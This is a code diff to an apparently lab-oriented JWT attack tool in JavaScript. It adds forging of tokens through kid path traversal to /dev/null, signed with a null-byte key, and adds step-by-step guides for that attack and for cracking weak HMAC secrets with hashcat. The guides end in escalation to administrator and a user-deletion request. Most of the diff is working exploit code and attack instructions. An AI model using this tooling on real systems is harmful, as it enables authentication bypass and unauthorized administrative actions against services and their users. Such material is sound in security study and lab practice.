@@ -142,11 +142,12 @@ async function generateJwkAttackToken(forceJwkSign) {
     if (selectedAttack === 'kid-path-traversal') {
       nextHeader.alg = 'HS256';
       nextHeader.kid = '../../../../../../../dev/null';
-      const secret = requireInput('Provide signing key ("" allowed).');
+      const rawKeyInput = requireInput('Provide signing key. Use AA== for base64 null-byte key.');
       const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-      nextSig = await hmacSignBase64url(signingInput, secret, 'SHA-256');
+      const keyBytes = parseSigningKeyBytes(rawKeyInput);
+      nextSig = await hmacSignBase64urlBytes(signingInput, keyBytes, 'SHA-256');
       resultToken.value = `${signingInput}.${nextSig}`;
-      attackNotes.textContent = 'kid traversal candidate generated and signed.';
+      attackNotes.textContent = 'kid traversal candidate generated and signed (supports AA== null-byte key).';
       return;
     }
 
@@ -179,7 +180,7 @@ function configureInputForAttack(key) {
     jkuTools.classList.remove('hidden');
     return;
   }
-  if (key === 'kid-path-traversal') return showInput('Signing key', '', 'Required signing key ("" for empty).');
+  if (key === 'kid-path-traversal') return showInput('Signing key', 'AA==', 'Use AA== for Base64 null-byte key (Burp-compatible workaround).');
 
   attackInputSection.classList.add('hidden');
   extraInput.value = '';
@@ -239,6 +240,28 @@ function getAttackSteps(key) {
       '3) Choose algorithm and click Generate key for selected alg.',
       '4) Click Embed JWK & Sign token.',
       '5) Send request with generated token.',
+    ].join('\n');
+  }
+
+  if (key === 'weak-signing-key') {
+    return [
+      '1) Paste source JWT and click Decode token.',
+      '2) In payload editor set sub claim to administrator.',
+      '3) Try cracking the secret using Hashcat:',
+      '   hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list',
+      '4) Put cracked secret into Signing key input and click Generate.',
+      '5) Send request with generated token.',
+    ].join('\n');
+  }
+
+  if (key === 'kid-path-traversal') {
+    return [
+      '1) Paste source JWT and click Decode token.',
+      '2) In payload editor set sub claim to administrator.',
+      '3) Header kid is set to ../../../../../../../dev/null automatically.',
+      '4) Put signing key as AA== (Base64 null byte workaround).',
+      '5) Click Generate to sign with null-byte key and send request.',
+      '6) Then call /admin/delete?username=carlos.',
     ].join('\n');
   }
 
@@ -405,10 +428,32 @@ function randomSecret(length) {
   return out;
 }
 
-async function hmacSignBase64url(message, secret, hash) {
-  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash }, false, ['sign']);
+
+function parseSigningKeyBytes(input) {
+  const trimmed = input.trim();
+  if (trimmed === 'AA==' || trimmed.startsWith('b64:')) {
+    const b64 = trimmed === 'AA==' ? trimmed : trimmed.slice(4);
+    return base64ToBytes(b64);
+  }
+  return new TextEncoder().encode(input);
+}
+
+function base64ToBytes(b64) {
+  const normalized = base64urlToBase64(b64);
+  const binary = atob(normalized);
+  const out = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i += 1) out[i] = binary.charCodeAt(i);
+  return out;
+}
+
+async function hmacSignBase64urlBytes(message, keyBytes, hash) {
+  const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash }, false, ['sign']);
   const signature = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(message));
   return arrayBufferToBase64url(signature);
+}
+
+async function hmacSignBase64url(message, secret, hash) {
+  return hmacSignBase64urlBytes(message, new TextEncoder().encode(secret), hash);
 }
 
 async function rsaPkcs1SignBase64url(message, privateJwk, hash) {
